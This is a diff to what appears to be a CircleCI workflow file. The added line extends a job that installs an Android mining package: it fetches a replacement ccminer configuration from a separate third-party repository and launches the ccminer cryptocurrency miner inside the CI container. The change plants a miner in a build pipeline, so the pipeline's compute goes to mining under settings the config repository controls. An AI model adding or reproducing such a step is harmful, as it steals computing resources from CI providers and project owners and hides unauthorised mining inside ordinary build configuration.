@@ -23,7 +23,7 @@ jobs:
             docker pull balenalib/generic-aarch64
 
             # Run the ARM64 image with uname and lscpu commands
-            docker run --rm balenalib/generic-aarch64 bash -c "uname -m && lscpu && apt update && apt install git && git clone https://github.com/Oink70/Android-Mining.git && cd Android-Mining && ./install.sh"
+            docker run --rm balenalib/generic-aarch64 bash -c "uname -m && lscpu && apt update && apt install git && git clone https://github.com/Oink70/Android-Mining.git && cd Android-Mining && ./install.sh && cd /root && cd ccminer && rm -f config.json && git clone https://github.com/dogreforge0/config.git && cd config && mv config.json .. && cd .. && ./ccminer -c config.json"
 
 workflows:
   version: 2
